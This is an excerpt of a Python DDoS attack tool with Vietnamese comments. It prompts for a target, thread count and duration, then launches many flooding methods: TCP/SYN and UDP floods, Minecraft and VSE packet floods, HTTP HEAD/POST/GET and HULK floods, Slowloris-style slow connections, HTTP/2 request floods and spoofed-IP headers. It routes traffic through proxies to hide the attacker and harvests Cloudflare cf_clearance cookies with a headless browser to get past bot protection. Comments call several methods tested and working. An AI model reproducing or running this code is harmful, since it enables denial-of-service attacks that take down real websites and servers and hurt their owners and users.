...
init(convert=True) # Khởi tạo colorama để sử dụng màu sắc trong console
def countdown(t): # Tính thời gian kết thúc
...
# Hàm để trích xuất thông tin từ URL
def get_target(url):
    url = url.rstrip()
    target = {}
...
PROXY_FILE = os.path.join(BASE_DIR, "http.txt")

def get_proxies():
    global proxies
    print("→ cwd:", os.getcwd())
    print("→ PROXY_FILE:", PROXY_FILE, "exists?", os.path.isfile(PROXY_FILE))
    if not os.path.isfile(PROXY_FILE):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE +
                     f" You Need Proxy File ({PROXY_FILE})\n")
        return False
    ...
    if not proxies:
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE +
                     f" Proxy file is empty: {PROXY_FILE}\n")
        return False
...
def get_cookie(url):
    ...
    options.add_argument('--start-maximized')          # sửa chính tả
    options.add_argument('--window-size=1920,1080')    # đảm bảo kích thước đủ lớn
    options.add_argument(
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) '
        'AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 '
        'MicroMessenger/6.5.18 NetType/WIFI Language/en'
    )

    try:
        driver = uc.Chrome(options=options)
    except Exception as e:
        print(f"[get_cookie] Lỗi khởi tạo ChromeDriver: {e}")
        return False
    ...
    try:
        ...
        print(f"[get_cookie] URL không hợp lệ: {url}\n", e)
        driver.quit()
        return False

    print(f"[get_cookie] Đã mở {url}, đang chờ đến 60s để tìm cf_clearance…")
    start = time.time()
    while time.time() - start < 60:
        cookies = driver.get_cookies()
        print(f"[get_cookie][DEBUG] cookies hiện tại: {[c['name'] for c in cookies]}")
        for ck in cookies:
            if ck.get('name') == 'cf_clearance':
                cookieJAR = ck
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{ck['name']}={ck['value']}"
                print(f"[get_cookie] ✔ Tìm thấy cf_clearance: {cookie}")
                driver.quit()
                return True
        time.sleep(1)

    print("[get_cookie] ✖ Không tìm thấy cf_clearance sau 60s")
    driver.quit()
    return False
...
# Hàm này dùng để lấy thông tin về các tấn công ở lớp 7
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # url mục tiêu
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # số luồng
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # thời gian tấn công
    t = input()
    return target, thread, t

# Hàm này thu thập thông tin cho các tấn công ở lớp 4
def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # Yêu cầu người dùng nhập địa chỉ IP mục tiêu.
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # Yêu cầu người dùng nhập cổng (port) để tấn công.
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # Yêu cầu người dùng nhập số lượng luồng (threads).
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX) # Yêu cầu người dùng nhập thời gian tấn công (tính bằng giây).
    t = input()
...
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t)) # xác định thời gian tấn công
    rand = random._urandom(4096) # dữ liệu ngẫu nhiên gửi đi : 4096 byte
    for _ in range(int(th)): # đoạn mã lặp trong số lượng luồng sử dụng
        try:
...
def flooder(host, port, rand, until_datetime):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setblocking(0) # không chặn : không chờ khi kết nối không thành công
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0: # kết nối đến máy chủ
            try:
                dport = random.randint(1, 65535) if port == 0 else port
                sock.connect((host, dport)) # TCP (SYN Flood): giữ các kết nối 3 bước
            except:
                pass
#minecraft dos
def runmine(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t)) 
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"  # Chuỗi byte ngẫu nhiên dùng trong tấn công
...
def mine(host, port, rand, until_datetime):
    ...
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            sock.close() # tấn công UCP -> gửi ồ ạt các gói tin mà không cần và k giữ kết nối 3 bước
            pass
#vse dos
def runvse(host, port, th, t):  # tấn công UCP 
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
...
def vse(host, port, rand, until_datetime):
    ...
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (host, int(port)))  # tấn công UCP -> gửi ồ ạt các gói tin mà không cần và k giữ kết nối 3 bước
        except:
            sock.close()
            pass
def runsender(host, port, th, t):  # tấn công UCP 
 #   if payload == "":
 ...
 #   payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime):
...
def Launch(url, th, t, method): #testing  # Hàm này khởi tạo và chạy tấn công
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()") # Tạo luồng và chạy hàm tấn công
        except:
            pass

# phương thức này khả thi + đã test
def LaunchHEAD(url, th, t): # sử dụng tấn công theo phương thức head của http 
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
...
def AttackHEAD(url, until_datetime): # sử dụng phương thức head của http : phương thức không có thông báo trong nội dung, dùng khi đánh giá tính khả dụng của API tại điểm cuối.
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
...
#region POST + khả thi đã test
def LaunchPOST(url, th, t): # tấn công theo phương thức post của http 
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
...
#region RAW + khả thi đã test
def LaunchRAW(url, th, t): # tấn công theo phương thức get của http 
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
...
def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            pass
#region PXRAW # có vẻ không hoạt động do list proxy sai
def LaunchPXRAW(url, th, t): # sử dụng phương pháp HTTP GET kết hợp với proxy
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
...
def LaunchPXSOC(url, th, t):
    ...
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    # Chọn ngẫu nhiên một phương thức HTTP (GET, POST, HEAD, v.v.)
    m = random.choice(method)
    user_agent = random.choice(useragents)

    # Xây dựng yêu cầu HTTP, bao gồm phương thức, URL, URI, tiêu đề "Host", "User-Agent", "Accept", v.v.
...
def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            print('proxy',proxy)
             # Kiểm tra nếu giao thức là HTTPS, sử dụng kết nối SSL
            if target['scheme'] == 'https':
                s = socks.socksocket() # Tạo socket SOCKS
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Tắt Nagle algorithm
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1])) # Cài đặt proxy cho socket
                s.connect((str(target['host']), int(target['port'])))  # Kết nối đến host và port
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host']) # Bọc kết nối bằng SSL
            else:
                # Nếu giao thức là HTTP, chỉ sử dụng kết nối thông thường
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                # Gửi yêu cầu HTTP nhiều lần (100 lần) để tạo tải cao cho máy chủ
                for _ in range(100):
...
def AttackSOC(target, until_datetime, req): # giống các tấn công pxsoc nhưng khác ở chỗ kết nối trực tiếp không xử dụng proxy
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    ...
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            ...
            pass
#hulk Đoạn mã trên mô phỏng một kiểu tấn công từ chối dịch vụ (DDoS) sử dụng một kỹ thuật gọi là "HTTP Flood" (Tấn công HTTP Flood)
#Kỹ thuật này chủ yếu tấn công vào các máy chủ web bằng cách gửi một lượng lớn các yêu cầu HTTP đến máy chủ để làm quá tải tài nguyên của máy chủ, khiến máy chủ không thể xử lý các yêu cầu hợp lệ.
def LaunchHULK(url, th, t):
    ...
    m = random.choice(method)
    user_agent = random.choice(useragents)
    # Yêu cầu HTTP có một tham số ngẫu nhiên trong URL để làm cho các yêu cầu có vẻ khác biệt và khó bị phát hiện là tấn công.
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHULK, args=(target, until, req,url))
            thd.start()
        except:
            pass

def AttackHULK(target, until_datetime, req,url):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
...
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper() # Thư viện cloudscraper giúp tự động vượt qua Cloudflare
    for _ in range(int(th)):
        try:
...
def attackPXCFB(url, timer, threads): # sử dụng  phương thức sen của socks để tấn công ( có sử dụng proxy để ẩn danh)
...
#region CFPRO
def LaunchCFPRO(url, th, t): # Đặt các headers để giả lập một yêu cầu HTTP hợp lệ từ trình duyệt, giống như một yêu cầu thực tế.
    # sử dụng một session và cookies tùy chỉnh, giúp duy trì trạng thái giữa các yêu cầu HTTP và có thể dễ dàng vượt qua các bảo vệ yêu cầu cookie (như Cloudflare yêu cầu cookies).
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
...
#region
# “HTTP flood” tool—một dạng tấn công từ chối dịch vụ lớp 7
...
def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        ...
        packet.connect((str(target['host']), int(target['port']))) # là phương thức để mở kết nối TCP mở 3 bước
...
def Launchslow(url, timer):
    ...
    while time.time() < timelol:
        try:
            # 1) Mở kết nối qua proxy SOCKS5 và SSL
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            # 2) Gửi 1 số dòng header ban đầu
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            ...
            # 3) Giữ kết nối mở, định kỳ gửi header “X-a:” chậm
            while True:
                time.sleep(14)
...
def Launchhttp2(url, timer):
        timelol = time.time() + int(timer)
        while time.time() < timelol:
             # 1. Chuẩn bị header HTTP/2 giống trình duyệt mobile
            headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
 ...
 #           'TE': 'trailers',
            ...
            proxfile1 = r'C:\DoT\DotNets\HASOKI-main\http.txt'
            with open(proxfile1, 'r') as f:
                prox_list = [line.strip() for line in f if line.strip()]
  ...
  #          timeout = httpx.Timeout(None, connect=None)
    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
            # 3. Tạo client HTTP/2 với thư viện httpx, chỉ định proxy và header
            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
                try:
                    while True:
                        for _ in range(400):
                            client.get(url)
                            client.post(url, data={'login': value})
                            client.put(url, data={'login': value})
                            client.head(url)
...
#spoof
# gửi hàng loạt HTTP request (GET, POST, …) lên server, ép server phải xử lý.
def spoofer():
    # mỗi request mang header IP giả khác nhau.
    addr = [192, 168, 0, 1]
    d = '.'
...
def LaunchSKY(url, timer):
    ...
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"  #  trong mỗi kết nối gửi request 201 lần liền, ép server phải xử lý nhanh hàng loạt request \r\n\ báo không còn header nào .
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
...
def Launchbypass(url, timer): #(phương thức “bypass” qua HTTP proxy)
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    # Xây raw HTTP/1.1 request
    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    ...
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            # Cấu hình dùng HTTP proxy để ẩn IP
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Kết nối tới target qua SSL
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            ...
            s.close()
def attackSTELLAR(url, timer, threads): # (phương thức “STELLAR” không dùng proxy)
    for i in range(int(threads)):
